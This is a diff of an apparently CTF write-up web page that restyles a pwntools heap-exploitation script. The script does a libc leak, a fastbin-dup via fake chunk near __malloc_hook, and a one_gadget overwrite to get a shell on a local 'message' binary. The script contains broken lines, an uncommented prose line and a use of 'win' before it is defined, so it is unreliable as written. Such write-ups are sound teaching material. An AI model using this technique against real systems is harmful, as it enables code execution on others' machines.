@@ -3,7 +3,7 @@
     <meta charset='utf-8'>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="stylesheet" href="/assets/css/style.css?v=17941d18d5e8b6597efd5746996c8d7c1374c9d2">
+    <link rel="stylesheet" href="/assets/css/style.css?v=ad89651c35ce1f15ad2e2c36e337606f693f0ac8">
     <script src="https://kit.fontawesome.com/cad5e6b3e1.js" crossorigin="anonymous"></script>
 
 <!-- Begin Jekyll SEO tag v2.7.1 -->
@@ -261,121 +261,120 @@
 <!-- /wp:paragraph -->
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code>#!/usr/bin/python3
-from pwn import *
-#binary setup
-elf = context.binary = ELF('./message')
-context.terminal = ['tmux', 'splitw', '-hp', '70']
-gs = '''
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="c1">#binary setup
+</span><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./message'</span><span class="p">)</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">,</span> <span class="s">'-hp'</span><span class="p">,</span> <span class="s">'70'</span><span class="p">]</span>
+<span class="n">gs</span> <span class="o">=</span> <span class="s">'''
 continue
-'''
-libc = elf.libc
-index = 0
-def start():
-    if args.GDB:
-        return gdb.debug('./message', gdbscript=gs)
-    if args.REMOTE:
-        return remote('127.0.0.1', 5555)
-    else:
-        return process('./message')
-#add a message
-def malloc(size, data):
-    global index
-    r.sendline("0")
-    r.sendline(f"{size}")
-    r.sendline(data)
-    index += 1
-    return index - 1
-    print("index, ",index-1)
-#remove the message
-def free(index):
-    r.sendline("1")
-    r.sendline(f"{index}")
-    #r.recvuntil("choice :")
+'''</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
+<span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="s">'./message'</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gs</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="s">'127.0.0.1'</span><span class="p">,</span> <span class="mi">5555</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="s">'./message'</span><span class="p">)</span>
+<span class="c1">#add a message
+</span><span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">index</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"0"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="k">return</span> <span class="n">index</span> <span class="o">-</span> <span class="mi">1</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"index, "</span><span class="p">,</span><span class="n">index</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+<span class="c1">#remove the message
+</span><span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="c1">#r.recvuntil("choice :")
 #show the message
-def show(index):
-    r.sendline("2")
-    sleep(0.2)
-    r.sendline(f"{index}")
-    resp = r.recv(0x58)
-    #r.recvuntil("choice :")
-    return resp
-#3 change the timestamp
-def change(index):
-    r.sendline("3")
-    r.sendline(f"{index}")
+</span><span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x58</span><span class="p">)</span>
+    <span class="c1">#r.recvuntil("choice :")
+</span>    <span class="k">return</span> <span class="n">resp</span>
+<span class="c1">#3 change the timestamp
+</span><span class="k">def</span> <span class="nf">change</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
 
-r = start()
-#========= exploit here ===================
+<span class="n">r</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+<span class="c1">#========= exploit here ===================
 #sleeps for the buffering of the binary
 #===== LEAK ==========
-leak = malloc(0x200, "A" *8)
-sleep(0.3)
-guard = malloc(0x18, "YYYYYYYY")
-r.timeout = 0.1
-show(leak) #ctipe first
-sleep(0.3)
-free(leak) #free chunk
-sleep(0.3)
-show(leak) #show leak
+</span><span class="n">leak</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+<span class="n">guard</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span> <span class="s">"YYYYYYYY"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mf">0.1</span>
+<span class="n">show</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span> <span class="c1">#ctipe first
+</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span> <span class="c1">#free chunk
+</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+<span class="n">show</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span> <span class="c1">#show leak
 #it seems im buffering the output so some timeouts
 #maybe there's a better way to do it
-r.recvuntil("Message : ")
-r.timeout = 0.1
-sleep(0.3)
-r.recvuntil("Message : ")
-r.timeout = 0.1
-l = u64(r.recvline().strip().ljust(8,b'\x00'))
-libc.address = l - 0x399b78
-#no mitigations for fake chunk sizes
-log.info(f"libc leak {hex(l)}")
-log.info(f"libc base {hex(libc.address)}")
-log.info(f"malloc hook {hex(libc.sym.__malloc_hook)}")
-log.info(f"free hook {hex(libc.sym.__free_hook)}")
+</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Message : "</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mf">0.1</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Message : "</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mf">0.1</span>
+<span class="n">l</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">l</span> <span class="o">-</span> <span class="mh">0x399b78</span>
+<span class="c1">#no mitigations for fake chunk sizes
+</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"libc leak </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">l</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"libc base </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"malloc hook </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__malloc_hook</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"free hook </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__free_hook</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
 
-#============ redirecting flow of execution =====
-
-#double free (cuidado con el topfast)
+<span class="c1">#============ redirecting flow of execution =====
+</span>
+<span class="c1">#double free (cuidado con el topfast)
 #since we have a stamp date lets try to create fake chunks
 #allocating 2 chunks and a top one to anchor
-top_fast = malloc(96, "X"*8)
-sleep(0.3)
-A = malloc(96, p64(0x71) + p64(libc.sym.__malloc_hook-16))#fake chunk near malloc hook
-sleep(0.3)
-B = malloc(96, "B"*8)
-sleep(0.3)
-r.timeout = 0.1
-#free (not double free lest stack them manually)
-free(top_fast)
-sleep(0.3)
-free(A)
-sleep(0.3)
-free(B)
-sleep(0.3)
-#change the stamp 3 times will add 0x10
-change(B)
-sleep(0.3)
-change(B)
-sleep(0.3)
-change(B)
-sleep(0.3)
-setting up the fastbindup attack
-C = malloc(96, "C"* 32)
-sleep(0.3)
-D = malloc(96, "D"* 32)
-sleep(0.3)
-win - 0xdeadbeef
-malloc(96, b"A" *11 + win)
+</span><span class="n">top_fast</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">96</span><span class="p">,</span> <span class="s">"X"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+<span class="n">A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">96</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__malloc_hook</span><span class="o">-</span><span class="mi">16</span><span class="p">))</span><span class="c1">#fake chunk near malloc hook
+</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+<span class="n">B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">96</span><span class="p">,</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mf">0.1</span>
+<span class="c1">#free (not double free lest stack them manually)
+</span><span class="n">free</span><span class="p">(</span><span class="n">top_fast</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="n">A</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="n">B</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+<span class="c1">#change the stamp 3 times will add 0x10
+</span><span class="n">change</span><span class="p">(</span><span class="n">B</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+<span class="n">change</span><span class="p">(</span><span class="n">B</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+<span class="n">change</span><span class="p">(</span><span class="n">B</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+<span class="n">setting</span> <span class="n">up</span> <span class="n">the</span> <span class="n">fastbindup</span> <span class="n">attack</span>
+<span class="n">C</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">96</span><span class="p">,</span> <span class="s">"C"</span><span class="o">*</span> <span class="mi">32</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+<span class="n">D</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">96</span><span class="p">,</span> <span class="s">"D"</span><span class="o">*</span> <span class="mi">32</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+<span class="n">win</span> <span class="o">-</span> <span class="mh">0xdeadbeef</span>
+<span class="n">malloc</span><span class="p">(</span><span class="mi">96</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span><span class="mi">11</span> <span class="o">+</span> <span class="n">win</span><span class="p">)</span>
 
-win = p64(libc.address + 0xd6701)
-#win - 0xdeadbeef
-malloc(96, b"A" *11 + win) #add the one_gadget here
-sleep(0.3)
-malloc(24, "Y") #trigger malloc_hook
-
-#========= interactive ====================
-r.interactive()
-</code></pre>
+<span class="n">win</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xd6701</span><span class="p">)</span>
+<span class="c1">#win - 0xdeadbeef
+</span><span class="n">malloc</span><span class="p">(</span><span class="mi">96</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span><span class="mi">11</span> <span class="o">+</span> <span class="n">win</span><span class="p">)</span> <span class="c1">#add the one_gadget here
+</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+<span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="s">"Y"</span><span class="p">)</span> <span class="c1">#trigger malloc_hook
+</span>
+<span class="c1">#========= interactive ====================
+</span><span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
 <!-- /wp:code -->
 
 <!-- wp:paragraph -->
